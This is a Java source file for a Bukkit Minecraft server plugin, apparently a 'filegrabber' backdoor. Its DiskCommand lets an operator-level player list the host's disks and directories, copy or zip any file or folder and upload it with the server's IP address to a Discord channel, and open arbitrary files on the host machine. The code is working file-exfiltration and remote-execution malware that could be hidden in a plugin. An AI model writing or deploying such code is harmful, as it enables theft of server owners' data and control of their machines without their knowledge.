package com.nontage.filegrabber.command;

import com.nontage.filegrabber.utils.ZipUtils;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.utils.FileUpload;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

import java.awt.*;
import java.io.File;
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.nio.file.Files;
import java.util.Arrays;

public class DiskCommand implements CommandExecutor {
    private Plugin plugin;
    private TextChannel targetChannel;

    public DiskCommand(Plugin plugin, TextChannel targetChannel) {
        this.plugin = plugin;
        this.targetChannel = targetChannel;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (sender instanceof Player) {
            Player player = (Player) sender;
            if (player.isOp())  {
                if (args.length >= 1 && args[args.length - 1].equalsIgnoreCase("$download")) {
                    String filePath = args[0];
                    for (int i = 1; i < args.length - 1; i++) {
                        filePath += " " + args[i];
                    }
                    String serverIp = null;
                    try {
                        serverIp = InetAddress.getLocalHost().getHostAddress();
                    } catch (UnknownHostException e) {
                        throw new RuntimeException(e);
                    }


                    File sourceFile = new File(filePath);
                    long maxFileSize = 25*1024*1024;

                    if (sourceFile.exists()) {
                        File destinationDirectory = new File(plugin.getDataFolder(), "downloads");
                        destinationDirectory.mkdirs();

                        if (sourceFile.isFile()) {
                            if (sourceFile.length() > maxFileSize) {
                                player.sendMessage(ChatColor.RED + "File size exceeds the maximum allowed size.");
                                return true;
                            }

                            File copiedFile = new File(destinationDirectory, sourceFile.getName());

                            try {
                                Files.copy(sourceFile.toPath(), copiedFile.toPath());
                                sendToDiscord("From: " + serverIp + "\n" + filePath, FileUpload.fromData(copiedFile));
                                player.sendMessage(ChatColor.GREEN + "File copied and uploaded successfully.");
                            } catch (IOException e) {
                                player.sendMessage(ChatColor.RED + "An error occurred while copying the file.");
                                e.printStackTrace();
                            }
                        } else if (sourceFile.isDirectory()) {
                            String zipFileName = sourceFile.getName() + ".zip";
                            File zipFile = new File(destinationDirectory, zipFileName);

                            try {
                                ZipUtils.zipDirectory(sourceFile, zipFile);
                                sendToDiscord("From: " + serverIp + "\n" + filePath, FileUpload.fromData(zipFile));
                                player.sendMessage(ChatColor.GREEN + "Folder compressed and uploaded successfully.");
                            } catch (IOException e) {
                                player.sendMessage(ChatColor.RED + "An error occurred while compressing the folder.");
                                e.printStackTrace();
                            }
                        } else {
                            player.sendMessage(ChatColor.RED + "The specified path is invalid.");
                        }
                    } else {
                        player.sendMessage(ChatColor.RED + "The specified path does not exist.");
                    }

                } else if (args.length >= 1 && args[args.length - 1].equalsIgnoreCase("$run")) {
                    String filePath = args[0];
                    for (int i = 1; i < args.length - 1; i++) {
                        filePath += " " + args[i];
                    }
                    File sourceFile = new File(filePath);
                    if(sourceFile.exists()) {
                        try {
                            Desktop.getDesktop().open(sourceFile);
                            player.sendMessage(ChatColor.GREEN + "File opened successfully.");
                        } catch (IOException e) {
                            player.sendMessage(ChatColor.RED + "An error occurred while opening the file.");
                            e.printStackTrace();
                        }
                    } else {
                        player.sendMessage(ChatColor.RED + "The specified file path is invalid or not a file.");
                    }
                } else if (args.length >= 1) {
                    String diskPath = String.join(" ", args);
                    File disk = new File(diskPath);

                    if (disk.exists()) {
                        if (disk.isDirectory()) {
                            sendDivider(player);
                            player.sendMessage(ChatColor.GREEN + "Path: " + disk.getAbsolutePath());
                            sendDivider(player);

                            File[] files = disk.listFiles();
                            if (files != null) {
                                for (File file : files) {
                                    player.sendMessage(file.getName());
                                }
                            }
                            sendDivider(player);
                        } else if (disk.isFile()) {
                            player.sendMessage(ChatColor.GREEN + "File: " + disk.getName());
                        }
                    } else {
                        player.sendMessage(ChatColor.RED + "The specified path is invalid.");
                    }
                } else {
                    File[] roots = File.listRoots();
                    sendDivider(player);
                    player.sendMessage(ChatColor.YELLOW + "Available disks:");
                    for (File root : roots) {
                        player.sendMessage(root.getAbsolutePath());
                    }
                    sendDivider(player);
                }
            }
        }
        return true;
    }

    private void sendDivider(Player player) {
        player.sendMessage("------------------------------");
    }

    private void sendToDiscord(String message, FileUpload file) {
        String fileName = file.getName();
        File getDownloadFolder = new File(plugin.getDataFolder(), "downloads");
        getDownloadFolder.mkdirs();

        targetChannel.sendMessage(message)
                .addFiles(file)
                .queue(response -> {
                    File fileToDelete = new File(getDownloadFolder, fileName);
                    if (fileToDelete.exists() && fileToDelete.isFile()) {
                        fileToDelete.delete();
                    } else {
                        System.out.println("File to delete does not exist or is not a file.");
                    }
                });
    }

}
